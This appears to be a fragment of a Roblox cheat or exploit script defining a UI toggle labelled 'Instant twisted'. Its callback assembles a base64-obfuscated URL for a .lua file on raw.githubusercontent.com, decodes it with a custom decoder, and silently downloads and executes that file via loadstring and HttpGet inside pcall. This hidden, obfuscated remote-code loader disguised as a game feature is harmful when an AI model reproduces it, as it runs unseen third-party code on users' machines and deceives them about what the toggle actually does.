TechTab:Toggle({
    Title = "Instant twisted",
    Value = false,
    Callback = function(state)
        if state then
            local parts = {"aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2xldHVh","bmtpZXQwOTgxMjM0NS1jbXlrL1Rlc3RraWJhL3JlZnMvaGVhZHMv","bWFpbi9lZGZhMzg1ZWY1YzQ3ZDNhLmx1YQ=="}
            local encoded = table.concat(parts)
            local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
            local function d(data)
                data = data:gsub('[^'..b..'=]', '')
                return (data:gsub('.', function(x)
                    if x == '=' then return '' end
                    local r, f = '', (b:find(x) - 1)
                    for i = 6, 1, -1 do r = r .. (f % 2^i - f % 2^(i-1) > 0 and '1' or '0') end
                    return r
                end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
                    if #x ~= 8 then return '' end
                    local c = 0
                    for i = 1, 8 do c = c + (x:sub(i, i) == '1' and 2^(8-i) or 0) end
                    return string.char(c)
                end))
            end
            pcall(function() loadstring(game:HttpGet(d(encoded)))() end)
        end
    end
})

